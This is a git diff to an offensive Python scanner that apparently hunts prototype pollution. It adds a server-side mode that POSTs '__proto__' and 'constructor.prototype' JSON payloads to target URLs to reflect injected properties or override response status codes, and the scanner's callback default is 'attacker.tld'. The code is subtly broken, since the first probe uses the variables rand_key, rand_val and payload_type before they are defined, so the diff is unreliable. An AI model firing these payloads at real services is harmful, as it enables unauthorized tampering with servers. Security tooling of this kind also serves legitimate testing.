@@ -11,7 +11,7 @@ CHECK_SCRIPT = "(window.ppfuzz || Object.prototype.ppfuzz) == 'reserved' && true
 console = Console()
 
 class Scanner:
-    def __init__(self, concurrency: int = 15, timeout: int = 30, proxy: str = None, headers: dict = None, user_agent: str = None, verify_exploit: bool = False, callback_url: str = "attacker.tld"):
+    def __init__(self, concurrency: int = 15, timeout: int = 30, proxy: str = None, headers: dict = None, user_agent: str = None, verify_exploit: bool = False, callback_url: str = "attacker.tld", sspp: bool = False):
         self.concurrency = concurrency
         self.timeout = timeout
         self.proxy = proxy
@@ -19,6 +19,7 @@ class Scanner:
         self.user_agent = user_agent
         self.verify_exploit = verify_exploit
         self.callback_url = callback_url
+        self.sspp = sspp
         self.semaphore = asyncio.Semaphore(concurrency)
         self.known_targets = set()
 
@@ -69,6 +70,9 @@ class Scanner:
 
     async def _scan_single(self, context: BrowserContext, url: str, progress: Progress, task_id):
         async with self.semaphore:
+            if self.sspp:
+                return await self._scan_sspp(context, url, progress, task_id)
+            
             page = None
             try:
                 page = await context.new_page()
@@ -94,7 +98,6 @@ class Scanner:
                     pass
 
                 if is_vuln:
-                    # Use progress.print to print ABOVE the progress bar
                     progress.print(f"[bold green]VULN[/bold green] {url}", soft_wrap=True)
                     
                     gadgets = []
@@ -146,12 +149,136 @@ class Scanner:
                 }
             return None
 
+    async def _scan_sspp(self, context: BrowserContext, url: str, progress: Progress, task_id):
+        page = None
+        try:
+            payload = {
+                "__proto__": {
+                    rand_key: rand_val
+                }
+            }
+            
+            try:
+                api_request = context.request
+                response = await api_request.post(
+                    url, 
+                    data=payload,
+                    headers={"Content-Type": "application/json"},
+                    timeout=self.timeout * 1000
+                )
+                
+                resp_json = await response.json()
+                if isinstance(resp_json, (dict, list)):
+                    if self._recursive_search(resp_json, rand_key, rand_val):
+                         progress.print(f"[bold green]VULN (SSPP)[/bold green] {url} - Reflected property {rand_key}:{rand_val} via {payload_type}", soft_wrap=True)
+                         return {
+                             "url": url,
+                             "vuln_type": "SSPP",
+                             "payload_type": payload_type,
+                             "details": f"Reflected property {rand_key}:{rand_val}"
+                         }
+                         
+            except Exception:
+                pass
+            
+            malformed_payload = "invalid json}"
+            baseline_status = None
+            
+            try:
+                api_request = context.request
+                resp_baseline = await api_request.post(
+                    url, 
+                    data=malformed_payload,
+                    headers={"Content-Type": "application/json"},
+                    timeout=self.timeout * 1000
+                )
+                try:
+                    baseline_json = await resp_baseline.json()
+                    if isinstance(baseline_json, dict):
+                         baseline_status = baseline_json.get("status") or baseline_json.get("statusCode")
+                except:
+                    pass
+            except:
+                pass
+
+            polluted_status_code = 555
+            status_payloads = [
+                ("__proto__", {
+                    "__proto__": {
+                        "status": polluted_status_code,
+                        "statusCode": polluted_status_code
+                    }
+                }),
+                ("constructor.prototype", {
+                    "constructor": {
+                        "prototype": {
+                            "status": polluted_status_code,
+                            "statusCode": polluted_status_code
+                        }
+                    }
+                })
+            ]
+
+            for payload_type, payload in status_payloads:
+                try:
+                    await api_request.post(
+                        url, 
+                        data=payload,
+                        headers={"Content-Type": "application/json"},
+                        timeout=self.timeout * 1000
+                    )
+                    
+                    resp_probe = await api_request.post(
+                        url, 
+                        data=malformed_payload,
+                        headers={"Content-Type": "application/json"},
+                        timeout=self.timeout * 1000
+                    )
+                    
+                    try:
+                        probe_json = await resp_probe.json()
+                        if isinstance(probe_json, dict):
+                             probe_status = probe_json.get("status") or probe_json.get("statusCode")
+                             
+                             if probe_status == polluted_status_code:
+                                 if baseline_status != polluted_status_code:
+                                     progress.print(f"[bold green]VULN (SSPP - Status Override)[/bold green] {url} - Status code became {polluted_status_code} via {payload_type}", soft_wrap=True)
+                                     return {
+                                         "url": url,
+                                         "vuln_type": "SSPP_STATUS_OVERRIDE",
+                                         "payload_type": payload_type,
+                                         "details": f"Status code override to {polluted_status_code}"
+                                     }
+                    except Exception:
+                        pass
+                        
+                except Exception:
+                    pass
+
+        except Exception as e:
+            pass
+        finally:
+            progress.advance(task_id)
+        return None
+
+    def _recursive_search(self, obj, key, value):
+        if isinstance(obj, dict):
+            if obj.get(key) == value:
+                return True
+            for k, v in obj.items():
+                if self._recursive_search(v, key, value):
+                    return True
+        elif isinstance(obj, list):
+            for item in obj:
+                if self._recursive_search(item, key, value):
+                    return True
+        return False
+
     async def _verify_xss(self, context: BrowserContext, url: str, progress: Progress):
         page = None
         try:
             page = await context.new_page()
             
-            # Setup dialog listener
             dialog_future = asyncio.Future()
             
             def handle_dialog(dialog):
